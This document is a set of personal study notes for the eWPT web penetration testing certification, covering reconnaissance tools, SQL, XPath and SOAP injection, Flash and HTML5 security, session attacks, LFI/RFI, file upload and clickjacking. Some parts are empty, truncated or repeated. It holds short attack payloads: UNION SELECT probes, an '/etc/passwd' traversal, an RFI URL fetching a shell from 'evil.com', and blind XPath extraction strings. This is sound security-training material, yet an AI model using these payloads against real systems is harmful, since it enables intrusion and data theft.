# eWPT
eWPT Notes

- Information Gathreing:

  - Tools
    ```
    Whois
    nslookup
    Netcraft
    netcat
    httprint, 
    whatweb,
    wappalyzer
    ```
  - Subdomain Enumeration:
    ```
    Google
    Brurtefoce

    Toolsl:
     SubLister
    Subfinder
    findomain
    amass 
    Zone Transfer (attack)

     dnsrecon: https://github.com/darkoperator/dnsrecon
    • subbrute: https://github.com/TheRook/subbrute
    • fierce: https://github.com/davidpepper/fierce-domain-scanner
    • Nmap: http://nmap.org/book/man-host-discovery.html
    • dnsenum: https://code.google.com/archive/p/dnsenum/downloads
    • knock: https://github.com/guelfoweb/knock
    • theHarvester: https://github.com/laramies/theHarvester
    • recon-ng: https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage Guide
    ```
    
  - Url Extracting:
    ```
    waybackurls
    waybackurls
    BurpSpider
    ```
    
  - FingerPrinting:
    ```
    Wappalayzer
    Whatwep
    Check Response Headers

    Our first step in this case will be to consider the overall scope of
    the application:
    • What is it for?
    • Does it allow user registration?
    • Does it have an administration panel?
    • Does it take input from the user?
    • What kind of input?
    • Does it accept file uploads?
    • Does it use JavaScript or Ajax or Flash? And so on.
    ```
    
  - Enumerate Resources (Files):
    ```
    Burb -Spider
    DirBuster
    Drib
    DirSearch
    Fuff
    Wfuzz
    Enumerate User
    Patator
    BurbBurb -Spider
    
    Enumerate Http Method
      Burbsuite
      Netcat
      Using Option Http Header

    Public file search tools
      Google Dorks
      Foca
      Metagoofil
    ```
    
  - Google Dorking Methods:
    ```
    https://pentest-tools.com/information-gathering/google-hacking
    https://www.exploit-db.com/google-hacking-database
    http://www.googleguide.com/advanced_operators_reference.html

    Shodan Dorking
    Shodan Searcher Zeyad Azima
    ```
    
- XSS:
  ```
  ```
    
- Sql Injection:
  ```
  Detecting the number of fields needed to exploit an in-band SQL
  injection looks like the following:
    • 9999 UNION SELECT NULL; -- -
    • 9999 UNION SELECT NULL, NULL; -- -
    • ...
    • 9999 UNION SELECT NULL, NULL, NULL, NULL; -- -

    • SELECT id, real_name FROM users WHERE id='9999'
      UNION SELECT NULL; -- -

    • SELECT id, real_name FROM users WHERE id='9999'
      UNION SELECT NULL, NULL; -- -

    ' UNION SELECT null, null; -- -
    ' UNION SELECT 1, null; -- -
    ' UNION SELECT 1, null; -- -
    ' UNION SELECT 1, 1; -- -
    ' UNION SELECT 1, 'a'; -- -
  ```
    
- Flash exploit:
  ```
        Adobe Flash is a technology used to create video, animations and
    other rich content. Flash files can be used as standalone
    applications or be embedded in HTML pages.
    The contents can be developed using several tools: Adobe Flash
    Professional (the most popular), Flash Develop, Ajax Animator,
    Flash Minibuilder, etc.

    To build the logic of the application, Adobe provides a scripting
    language called ActionScript. This language is based on ECMA-262
    specs and is very similar to JavaScript.

    Examples of commercial decompiler:
    • Sothink Flash decompiler
    • Trillix Flash decompiler

    allowScriptAccess can have three values:

    Always
    • The SWF file can always communicate with the HTML page regardless of the
    domain(SWF can be on a domain A and communicate with domain B).
    sameDomain
    • The SWF file can communicate with the HTML page only if they share the
    same domain.
    Never
    • The SWF file can never communicate with the HTML page

    Always
    • The SWF file can always communicate with the HTML page regardless of the
    domain(SWF can be on a domain A and communicate with domain B).
    sameDomain

          Pssing Argument to Flash Files

    Method 1 – Direct reference
    Flash is not embedded in an HTML page and arguments are
    provided directly through the URI. When the browser directly
    loads the URI, a dummy HTML page is created.

    Method 2 – Flash Embedded in HTML page
    Flash is embedded in an HTML page and arguments are passed
    through the attribute data of the object element.

    Method 3 – FlashArgs attribute
    Flash is embedded in the HTML page and arguments are passed
    through the attribute FlashArgs of the object element.

              Flash Security Model
    Sandbox and stakeholder are two important concepts in the Flash
    security paradigm.
    In this chapter, we will go through them while trying to both depict
    the Flash security model and how it impacts overall web
    application security.

              Stack Holders
    Who:
    The Administration role is represented by the system administrator
    responsible for the Flash player installation.
    They can configure Flash security settings that will affect all
    operating system users. 

    How:
    • This text configuration file is read when Flash player starts. It allows administrators
    to grant or restrict access to a variety of features. In Microsoft systems, it is
    generally located in the directory system32\Macromed\Flash.
    mms.cfg

    The Global Flash Player Trust directory
    • Administrators can register SWF files as trusted for all operating system users; this
    means that SWF files can interact with other SWF files and can load data from local
    and remote locations.

                      User Role
    How:
    Settings manager, Settings UI
    • The Settings Manager and Settings UI provide security-related options such as:
    camera and microphone settings, shared object storage settings, settings
    related to legacy content, and so on.

    User Flash Player Trust directory
    • Users can register SWF files as trusted; this means that SWF files can interact
    with other SWF files and can load data from local and remote locations.

                      Website Role

    Depending on the requested resource, ActionScript can initiate
    two different types of connection:
    • Document-based server connection for ActionScript objects
        • Loader (to load SWF files or images JPG, PNG, GIF)
        • Sound
        • URLLoader (to load text or binary data)
        • URLStream
        • Socket connection for ActionScript objects
        • Actionscript socket
        • XMLSocket

               Socket policy file
    This policy file is checked by the Flash player whether or not it is a
    socket connection.
    By default, the Flash player looks for a socket policy file on port
    843; we refer to this policy file as the Master policy file.

                 Author Role

    Who:
    The author role is represented by the developer of the Flash
    animation.
    This role can affect the interaction between SWF files available on
    different domains.

    How:
    The API Security.allowDomain(<allowedDomain>) grants
    permissions to the following features:
    • The interaction between different SWF files (Flash CrossScripting)
    • Display list access
    • Event detection
    • Full access to properties and methods of the Stage object

                           Method Native Url
    https://web.archive.org/web/20170328012534/https:/help.adobe.com/en_US/ActionScript/3.0_ProgrammingAS3/WS5b3ccc516d4fbf351e63e3d118a9b90204-7c9b.html

    Flash features an internal storage mechanism based on Local
    Shared Objects.
    Conceptually, Local Shared Objects are similar to browser cookies:
    • They can be used to track user activity or to store preferences.
    • They are read-only by subdomains that have set them.

    However, there are also some significant differences:
    • They are not sent back and forth over HTTP connections.
    • They do not expire.

    • They are stored in a dedicated Flash directory and are shared
    by all browsers on a system.
      • Example: a local shared object set through the Mozilla browser by a domain
    example.com can be read by a Chrome browser (installed on the same
    machine) visiting the same domain. (Cross-browser access.)
    • Path in Windows 7: C:\Users\<user>\AppData\Roaming\Macromedia\Flash
    Player\#SharedObjects\
    • They can contain complex (and large amounts of) data, so
    they offer the advanced features of local storage.

    A Flash Parameter injection vulnerability occurs when:

     The attacker can insert malicious code into the web
    application.
     The web application passes the input provided by the attacker
    to the Flash animation without any significant sanitization.
    The Flash animation, embedded in the HTML page, does not
    sanitize input parameters.
     The SWF source code allows HTML injections or XSS.

    Features 
     Actionscript 2/3 disassembling
     SWF tag viewing
     Local Shared Object (LSO) analyzing
     Dynamic function calling

               Finding Hardcoded Sensitive Informations 
    As we said earlier, Flash contents need to be compiled before they can
    be run.
    Many Flash developers believe that it is impossible to obtain the source
    code of the Flash application once compiled. They are often misled by
    this idea, and may, in turn, hardcode information:
    • URLs of hidden resources
    • Resources that should be hidden to regular users
    • Credentials of services

    The following is a brief walkthrough of the security checks to
    perform when you encounter a Flash component on a website.
    Main areas to check are:
    • Client-side components (SWF files and container page)
    • The Communication protocol between the client side player
    and the server-side components
    • Server-side components

    Static analysis of the SWF source code:
    Obtain the source code of the SWF files and search for
    interesting hard-coded information (URL, credentials info,
    etc.).
     Check if input parameters are sanitized.

    Analysis of the container page (generally the HTML page
    containing the Flash SWF file):
    • Check the allowScriptAccess parameter.
    • Check if input arguments that will be passed to the Flash are
    sanitized.

    Analysis of the website hosting the Flash application
    • Check if the policy file (crossdomain.xml) is configured
    properly.
    Search for common vulnerabilities
    • If the input is not sanitized, you must check whether an
    attacker can take advantage of it. Check for common
    vulnerabilities (HTML injections, XSS). You could use the
    SWFinvestigator’s XSS fuzzer.

    A complex Flash application may make use of web services. So,
    each request could be sent according to a given protocol:
    • SOAP
    • AMF
  ```
    
- Authentication & Authorization:
  ```
    Web applications should create the password reset link and
    maintain the following rules:
    • The link should contain a token
    • The token should abide by the following rules:
    • Minimum length N characters: N>6
    • Wide Character Set: For example, [A-Za-z0-9]
    • Purely random and unpredictable
    • Subject to expiration soon: 30 or 60 
    minutes 

    Publicly known default credentials can quickly result in
    compromise, as illustrated by bAdmin, Phenoelit, and CIRT.

    The following is an example of guessable password reset link. In
    this case, an attacker only needs the user email address.

    It is worth noting that there are techniques and tools that work on both
    third-party and in-house CAPTCHA schemes:
    • Cintruder: https://cintruder.03c8.net/
    • Bypass CAPTCHA with OCR engine:
    http://www.debasish.in/2012/01/bypass-captcha-using-pythonand.html
    • Decoding CAPTCHA: https://boyter.org/decoding-captchas/
    • OWASP: Testing for CAPTCHA: https://boyter.org/decodingcaptchas/

    Besides automated tools, you should also consider that it is cheap
    enough to hire people for breaking CAPTCHA puzzles:
    • Virtual sweatshops versus capt
    • Spammers use the human touch to avoid CAPTCHA
    • Virtual sweatshops defeat Bot-or-Not Tests
    For this reason, CAPTCHA should be only considered as a small
    added security difficulty against attackers.

    https://owasp.org/www-project-top-ten/
    A4 
    A7
    A8

  ```
    
- Session Security:
  ```
    It is also very important to not store session tokens in:


    • URL: the session token will be leaked to external sites through
    the referrer header and in the user browser history
    • HTML: the session token could be cached in the browser or
    intermediate proxies
    • HTML5 Web Storage:
    • Localstorage: will last until it is explicitly deleted, so this may make session
    last too long.
    • Sessionstorage: is only destroyed when the browser is closed. There may be
    users that will not close their browser in a long time.

    Session Hijacking refers to the exploitation of a valid session
    assigned to a user. The attacker can get the victim’s session
    identifier using a few different methods, though typically an XSS is
    used.
    • Note that if the session identifier is weakly generated (see
    the previous chapter), the attacker might be able to bruteforce the session ID

    Session fixation is a session hijacking attack where, as the name
    suggests, the attacker fixates a sessionID and forces the victim to
    use it (after the user logs in).
    The attack can be divided into two phases:
    1. The attacker obtains a valid sessionID
    2. The attacker forces the victim to use this sessionID to
    establish a personal session with the web server

    This is not a vulnerability; however, it could turn into Session
    Fixation if:

    The session identifier remains the same after a
    successfully reserved operation (for example, a login)
    • The session identifier can be propagated (for example: via
    URL or JavaScript) 
  ```
    
- HTML5:
  ```
  First, we need to know the different types of cross-origin requests
  that a browser can send.
  Depending upon the request type, the exchanged headers will
  vary. There are:
  • Simple requests
  • Preflight requests
  • Requests with credentials

  A cross-origin request is a Simple request if:
  • It only uses GET, HEAD or POST HTTP methods. If the
  request method is POST, the Content-Type HTTP header
  must be one of the following:
  • application/x-www-form-urlencoded
  • multipart/form-data
  • text/plain
  • It does not set custom HTTP headers (i.e., headers that are
  not defined within the HTTP/1.1 specs).

  A cross-origin request is a Preflight request when it is not a Simple
  request.
  Let’s see some examples:
  • A PUT request
  • A POST request with Content-type set to
  application/xml
  • A GET request with a custom header such as XPINGOTHER

  Access control headers dictate how the browser has to treat cross origin
  requests. In the next slides you will study the following headers:
  • Access-Control-Allow Origin
  • Access-Control-Allow-Credentials
  • Access-Control-Allow-Headers
  • Access-Control-Allow-Methods
  • Access-Control-Max-Age
  • Access-Control-Expose-Headers
  • Origin
  • Access-Control-Request-Method
  • Access-Control-Request-Header

  Let’s explain the differences:
   Size: cookie size is limited to 4KB, while localStorage size ranges
  from 5MB to 10MB (depending on the browser implementation)
  • Interface: cookies are accessed by client/server and transferred over
  HTTP connections, localStorage is known only to the browser
  • Data model: cookies represent a complex structure by using different
  fields, while web storage provides a simpler interface by using an
  associative array data model.

  This storage is persistent and will be deleted when one of thefollowing events occur:
  • The web application deletes storage through
  localStorage API calls
  • The user deletes storage using the browser cleaning
  feature
  • For example, through the Clear Recent History feature 

  Session storage can be accessed via JavaScript through the
  sessionStorage object.
  Web developers can manage the sessionStorage via the
  same API interface of the localStorage:
  • setItem
  • getItem
  • removeItem
  • clear

  The WebSocket protocol features:
  Connection established by upgrading an existing HTTP connection to
  WebSocket
  Supported by browsers
  • ws:// for WebSockets
  • wss:// for Secure WebSockets
  HTTP standard ports 80,443
  • This means: no firewall issues for the users
  Full-duplex
  • The protocol allows communication in both directions simultaneously


  Through the WebSocket protocol, real-time applications can take
  advantage of the following benefits:
  • Minimal packet overhead
  • 2 bytes per packet (at the application layer)
  • No polling overhead
  • A client sends data only when it has something to send
  • Real TCP connections allow low latency

  The previous attack is possible because:
  • The target website hosts the attacker’s iframe
  • The target website does not prevent an attacker from
  changing the location property

  This could be dangerous in the presence of multiple vulnerabilities.

  For example, in a scenario where:
  • the attacker succeeds in exploiting a persistent XSS in the
  vulnerable.html page
  • the vulnerable.html page is included through an iframe
  into the index.hmtl page

  To understand the attack, consider that:
  • The index.html page includes the page vulnerable.html
  through an iframe.
  • The JavaScript code on the iframe can access the parent
  document (index.html) because of the same origin policy;
  therefore, the iframe can change the main document’s
  contents.

  When the sandbox attribute is set to an empty value, all the
  following restrictions on iframe content apply:
  Forms, scripts, and
  plugins are disabled
  Features that trigger
  automatically are
  blocked
  No links can target
  other browsing
  contexts
  • For example, a link clicked
  on in an iframe cannot open
  the page in the context of
  the parent document.

  By default, the sandbox attribute denies all. The attribute can also specify a set
  of flags, allowing some of the features above. 

            For example:
  ❑ ALLOW-SCRIPT
  • This flag allows script execution
  ❑ ALLOW-FORMS
  • This flag allows form submission
  ❑ ALLOW-TOP-NAVIGATION
  • This flag allows theedwsfd
  ```

- Files and Resources Attacks:
```
    LFI 
    The vulnerability is easier to understand if we look at a simple
    section of PHP code. Let’s suppose that the target application
    changes its content depending on the location of the visitor. The
    URL will be something like this:

    http://target.site/index.php?location=IT
    and that the PHP code handles the parameter as follows:
    <?php
    include("loc/" . $_GET['location']);
    ?>


    As you can see, we can enter any valid local path-to-file to have the
    PHP include it in the response to our browser:
    This will go up 3 directories and then return etc/passwd which is
    the famous Unix password file.
    index.php?location=../../../etc/passwd
    These vulnerabilities are usually found in little custom made CMS’s

    where pages are loaded with an include and their paths taken from
    the input.


    RFI
    Remote File Inclusion (RFI) works in the same way as LFI; the only
    difference is that the file to be included is pulled remotely.
    Our aim, in this case, is not just to read, but to include our own
    code in the execution. An exploitable URL would look like this:
    vuln.php?page=http://evil.com/shell.txt

    In this case, shell.txt (containing PHP code) will be included in
    the page and executed.
    A common exploit to this vulnerability is to include a PHP shell that
    would let the hacker or the pentester execute any code on the
    server.
    Even the simplest PHP shell will accept commands from GET/POST
    arguments and execute them on the server.

    To verify what happens, we are going to use the following code for
    both files test.php and test.txt (both hosted on the attacker
    machine).
    This simple PHP script calls the phpinfo() function, which
    returns information on the current status of PHP running on the
    machine.
    <?php
    phpinfo();
    ?>

    This vulnerability should be checked when an include is thought
    to be present in the code.
    To immediately spot a vulnerable parameter, you can just inject
    “http://www.google.com”
    If it is vulnerable, the HTML code of google.com should be injected
    into the vulnerable web page.
    vuln.php?page=http://www.google.com
    
    Un Secure File Upload
    https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

    Let’s see how this vulnerability works and how it can be exploited.
    Let’s suppose that our target web application is both hosted on the
    following domain http://fileupload.site and an
    authenticated user can upload a personal image on his/her profile
    page

    In order for the application to be vulnerable, the following
    conditions will apply:
    The file type is not checked against a whitelist of allowed formats
    The file name and path of the uploaded file is known to the attacker or
    guessable
    The folder in which the file is placed allows the execution of server-side scripts 

    The attack
    The image is successfully uploaded, and if we inspect the source
    code of the page, we can see that it is stored on the web server in
    the uploads folder. Moreover, it is renamed with our user ID (231
    in our case):

    It seems that the vulnerability is there. We can now try to navigate the
    URL fileupload.site/uploads/231.php. As we can see, the
    vulnerability exists, and we are able to get the server information thanks
    to the file that was just uploaded.
    ```

- Other Attackes:
```
    Clickjacking
    Technically, an attacker that wants to perform this attack crafts a
    malicious HTML page. This page can contain two overlapping
    layers, one malicious and the other the actual target of the click.
    The malicious layer is what is visible to the victim and contains an
    innocuous resource (it could be the Play button of a video, for
    example) that the victim should feel secure clicking on. 

    The attack comprises four steps:
    Feasibility study
    Building of a malicious web page
    Spreading of the malicious page link
    Waiting for the victim to click

    Clickjacking can be leveraged to perform a wide number of attacks such
    as: forcing users to click on ads (leveraging something like Facebook) or
    performing any action that only requires clicking on a website.
    The following are some real-world vulnerabilities:
    https://news.softpedia.com/news/LinkedIn-Fixes-Clickjacking-Vulnerability-in-Remove-Connections-Section-Video-322122.shtml
    https://news.softpedia.com/news/Google-Fixes-CSRF-Vulnerability-in-Translator-and-Clickjacking-Flaw-in-Gmail-Video-351036.shtml
    https://developer.joomla.org/security/news/544-20121102-core-clickjacking
    http://www.xsses.com/2016/04/facebook-clickjacking-vulnerability.html

    Until a few years ago, clickjacking defenses were very difficult to
    implement. Now, however, browser specs include specific methods
    to limit clickjacking, so let’s compare and contrast the two
    defensive schools of thought:
    https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet
    • Tries to avoid clickjacking by using
    JavaScript code The Old School
    • HTTP response headers, Content Security
    Policy, Browser Frame-Breaker The Current School

    You can find more about the clickjacking here:
    • http://javascript.info/tutorial/clickjacking#defences-andthe-ways-to-break-through
    • Frame Busting

    Bisnuess Logic Flow
    https://wiki.owasp.org/index.php/Testing_for_business_logic
```

- Web Service:
```
    Web Services

    They are usually intended to facilitate: 
    • Integration between applications: application 'A' uses
    features implemented in application 'B’
    • Separation within an application: front-end scripts that
    use web services functionalities to update the content

    You can implement web services in many different ways. The
    most commonly used and popular ones are:

    • XML-RPC: remote procedure call (RPC) protocol that uses
    XML (usually over HTTP) to invoke functionalities.
    • JSON-RPC: remote procedure call protocol that uses JSON
    • SOAP: messaging protocol that uses XML and provides
    more functionalities of XML-RPC
    • RESTful: set or principles to build a web service.

    XML-RPC, created in 1998, was the first web service protocol. It
    works by sending HTTP requests that call a single method
    implemented on the remote system.
    As you can imagine, the body of the request is in XML; thus, it can
    be used to send complex record and list structures.
    Let’s see an example.

    JSON-RPC is very similar to XML-RPC. However, it provides more
    human-readable messages and takes less space to send the same
    message XML-RPC sends.
    The message sent to invoke a method is a request with a single
    object serialized using JSON. It has three properties:
    • method: name of the method to invoke
    • params: an array of objects to pass as arguments
    • id: request ID used to match the responses/requests

    SOAP (Simple Object Access Protocol) is somehow the successor of
    XML-RPC since it provides more functionalities such as encryption,
    digital signature, and routing of SOAP messages.
    Note that SOAP web services may also provide a Web Services
    Definition Language (WSDL) declaration that specifies how they
    may be used.
    Let’s see an example.

    As we already said, REST (Representational State Transfer) is not a
    protocol, but rather a set of principle to build web services that
    focus on system's resources.
    REST web services generally use JSON or XML, but any other
    message transport format (such as plain-text) is possible.

    As we already said, REST (Representational State Transfer) is not a
    protocol, but rather a set of principle to build web services that
    focus on system's resources.
    REST web services generally use JSON or XML, but any other
    message transport format (such as plain-text) is possible.

    RESTful APIs are generally based on HTTP verbs to determine the action:
    HTTP verb Action
    GET Retrieve a resource on the server, list a collection of records
    • http://ws.site/book (e.g. List all books available)
    • http://ws.site/book/1 (e.g. View a specific book)
    PUT Change the state of a resource, replace or create it if it does not exist
    • http://ws.site/book/1 (e.g. Replace a book)
    POST Create a new resource or record
    • http://ws.site/book (e.g. Create a specific book)
    DELETE Delete a resource or record
    • http://ws.site/book/1 (e.g. Delete a book)

                      The WSDL Language


    A web service is characterized by:
    Each reflects a service provided by the server application
    One or more
    Methods
    It defines:
    • The structure of each message used to request a service
    • The structure of a message sent by the web service in
    response
    • The transport method used to transmit the messages
    A Protocol

    WSDL stands for Web Services Description Language. Web
    services, such as SOAP, use the WSDL language to formally
    describe the provided services (the methods).
    Through the WSDL specifications, any endpoint software knows
    what services are provided by the server application, their
    location, and the structure of the messages needed to request a
    service.

    In technical terminology, WSDL is an XML-based interface
    description language. The description contains different objects
    depending on the WSDL version; the objects describe the
    messages, the services, how they can be requested, how they can
    be transported.

    First of all, it is important to know that WSDL documents have
    abstract and concrete definitions:
    • Abstract: describes what the service does, such as the
    operation provided, the input, the output and the fault
    messages used by each operation
    • Concrete: adds information about how the web service
    communicates and where the functionality is offered

    If you want to dig deeper into the WSDL language, here are some
    useful references:
    • Understanding WSDL
    • Understanding Providing WSDL Documents
    • Understanding Web Services Specifications: WSDL

    UDDI (Universal Description, Discovery, and Integration) is a
    directory service used for storing information about web services.
    Thanks to UDDI, anyone can search for information about Web
    Services that are made available by or on behalf of a business.
    http://uddi.xml.org/

    The attack consists of the following few steps:
    1. The attacker starts the client application and gets the
    WSDL file
    2. The attacker analyzes the WSDL file to look for hidden
    methods and to get general information about the
    structure of each operation
    3. The attacker invokes some (hidden) methods

    So far we know we can use these three functions to interact with the
    application; let’s request the WSDL file and see what we can find.
    Remember that once we identify a web service, most of the time we can
    request the WSDL file by adding ?wsdl at the end of the URL.

    In order to mount this attack, the following is necessary:
    • The attacker has access to the WSDL file and knows all the services
    (methods) offered by the server application.
    • The attacker knows and can reach the end-point of the web service.
    • Some web service methods are protected by a firewall and cannot
    be invoked.
    • The firewall filters the requests only by SOAP body.
    • The server application relies on the SOAPAction header to detect
    the operation type.

    Let’s consider the following scenario:
    • The attacker has access to the WSDL file and knows two
    interesting operations: getUserInfo and deleteAllStudents
    • A firewall filters out requests coming from remote clients
    invoking the operation deleteAllStudents. Local client
    requests are allowed.
    • The firewall uses only the SOAP body to filter requests.
    • The server application relies on the SOAPAction header to
    detect the operation type.

    This attack can be avoided in one of the following ways:
    • By disabling the SOAPAction header.
    • By configuring the firewall to inspect the SOAPAction header
    when filtering the coming requests.

    If the web service uses the
    SOAP protocol, the
    injection payload must be
    encapsulated within a
    specific XML message
    based on the WSDL
    description.

    POST /StudentsWS.php HTTP/1.1
    Host: soap.site
    Connection: Keep-Alive
    User-Agent: PHP-SOAP/5.4.39-0+deb7u2
    Content-Type: text/xml; charset=utf-8
    SOAPAction: "getStudentInfo"
    Content-Length: 230
    <?xml version="1.0" encoding="UTF-8"?>
    <SOAP-ENV:Envelope xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/enve
    lope/"><SOAP-ENV:Body><SOAPENV:getStudentInfo><id>' OR 'a'='a
    </id></SOAP-ENV:getStudentInfo></SOAPENV:Body></SOAP-ENV:Envelope>

    Our previous web service is vulnerable to this type of attack. Let’s see what
    happens when we use the previous payload against the getStudentInfo
    function.

    You can obtain this in the following ways:
    • By using parameterized SQL queries
    • By using stored procedures
    • By validating the user input directly
```

- XML Attacks:
```
    XML Documents & Databases

    EXtensible Markup Language (XML) v1.0 is a markup language
    (such as HTML) mainly designed to describe data and not to
    display it.
    Due to their nature, XML documents are often used as databases.
    Data can be read and written through queries, and the XML
    database looks just like an XML document. 

    Note
    In contrast to HTML, you can use any naming convention you
    wish for elements, just as long as you follow these simple
    naming rules:
    • Names must start with a letter or underscore and cannot
    start with the letters xml
    • Names are case sensitive
    • Names can contain letters, digits, periods but no spaces

    In the previous slides, we covered the very basics of XML
    documents. If you want to know more about XML structures,
    elements and so on, please use the following online resources:
    • http://www.w3.org/XML/
    • http://www.w3schools.com/xml/default.asp
    • Microsoft.com XML Standards Reference

    XPath (XML Path Language) is a standard language used to query
    and navigate XML documents. At the time of this writing, the latest
    version is 3.0.
    XPath makes use of path expressions to select nodes from an XML
    document. Let’s make this clearer with an example.

    Before inspecting the previous XPath query, let’s analyze the 
    • /: select the document node
    • i.e., /root will select the root element
    • //: select all nodes (that match the selection) regardless of
    their position in the document
    • i.e., users//user select all user elements, no matter where they are
    under the users element
    • node_name: select all nodes with name node_name
    • i.e., users/user select all user elements that are children of users

    Let’s see some other expressions and conditions: 
    • @: select attributes
    • i.e., /@id select all attributes that are named id
    • [element and condition]: select all nodes that match the
    defined
    • i.e., user[username] select all user elements that contain at least one
    username element child
    • i.e., user[username/text()='john'] select all user elements that contain
    the username element child text set to 'john'
    • i.e., //user[@id='1'] select all user elements (no matter where they are
    in the document), with the attribute id set to 1


    Let’s now analyze our previous query:
    • //: select all user elements no matter where they are in the
    document
    • username/text()='<USERNAME>': return only the element
    with the username text value set to <USERNAME>
    • and: Boolean operator
    • password/text()='<PASSWORD>': return only the element
    with the password text value set to <PASSWORD>

    If you want to dig deeper into XPath expressions and syntax, please
    refer to the following resources:
    • https://www.w3schools.com/xml/xpath_syntax.asp
    • https://msdn.microsoft.com/enus/library/ms256086(v=vs.110).aspx

    For example, the logical operators must be specified in this
    manner:
    • and
    • or
    • not()

    Classic probes include:
    APOSTROPHE (')
    COMMA (,)

    With this process, the attacker takes advantage of the vulnerability
    to access restricted data. Generally, the attacker exploits the
    vulnerability to perform actions such as:
    • Bypassing authentication
    • Extracting the XML document structure and contents

    Some useful XPath statements to remember during the exploit are:
    *[1] Returns the root node
    name(*[1]) XPath function returning the identifier of the root node
    (users in our example)
    name(/users/*[1]) A function returning the identifier of the first child of the
    root node (user in our example)
    /users/user[position
    ()=1]/username
    Selects the username of the first user node (example). The
    user node is child of the root users node.
    Substring(‘label’,1,1) An XPath function returning the first character of the label
    string – ‘l’

    To get the first character of the string, the attacker must insert all
    of the following payload data until the TRUE condition is met:
    • ' or substring(name(/*[1]),1,1)= 'a
    • ' or substring(name(/*[1]),1,1)= 'b
    • ' or substring(name(/*[1]),1,1)= 'c
    • . . .
    • ' or substring(name(/*[1]),1,1)='u
    • This payload will verify the TRUE condition; so, the first character of the
    identifier is ‘u’

    In our example, the first username in the list is philip. The attacker
    will perform multiple XPath queries to find out all identifier’s
    characters:
    • ' or substring(/users/user[position()=1]/username,1,1)= 'a
    • ' or substring(/users/user[position()=1]/username,1,1)= 'b
    • ' or substring(/users/user[position()=1]/username,1,1)= 'c
    • . . .
    • ' or substring(/users/user[position()=1]/username,1,1)= 'p

    A good practice would be to filter out any non- alphanumerical
    character.
    Here is a very basic example:
    • $username=filterChars($_GET['username']);
    • $password=filterChars($_GET['password']);
    • $query="//user[username/text()='".$username."' and
    password/text()='".$password."']/username"; 


    Due to the nature of the exploit, the process can take a very long
    time, but it can be easily automated. To this end, many interesting
    exploit tools have been developed; the most important are:
    • XPath Blind Explorer http://code.google.com/p/xpath-blind-explorer/
    • Xcat https://github.com/orf/xcat
    Here you can find very useful resources:
    • XPath Injection 
    https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)
    • Blind XPath https://www.owasp.org/index.php/Blind_XPath_Injection
```
